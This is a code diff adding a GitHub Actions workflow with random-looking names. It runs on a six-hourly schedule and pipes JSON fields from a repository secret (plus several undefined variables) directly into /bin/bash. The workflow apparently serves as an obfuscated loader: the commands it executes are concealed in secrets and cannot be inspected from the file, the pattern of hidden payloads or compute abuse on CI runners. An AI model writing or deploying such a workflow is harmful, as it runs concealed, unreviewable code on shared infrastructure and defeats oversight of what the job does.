@@ -1,0 +1,24 @@
+name: corsetgoofy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: corsetgoofy
+        env:
+          bj71339: ${{ secrets.bj71339 }}
+        run: |
+          echo $bj71339 | jq -r .w704 | /bin/bash
+          echo $ueyn94323 | jq -r .rto6713 | /bin/bash
+          echo $a89 | jq -r .bsu150 | /bin/bash
+          echo $i720 | jq -r .g725 | /bin/bash
+          echo $wqqo4 | jq -r .tzrc25 | /bin/bash
+          echo $umnu27 | jq -r .g052 | /bin/bash
+          echo $k9347 | jq -r .xwh6 | /bin/bash
+
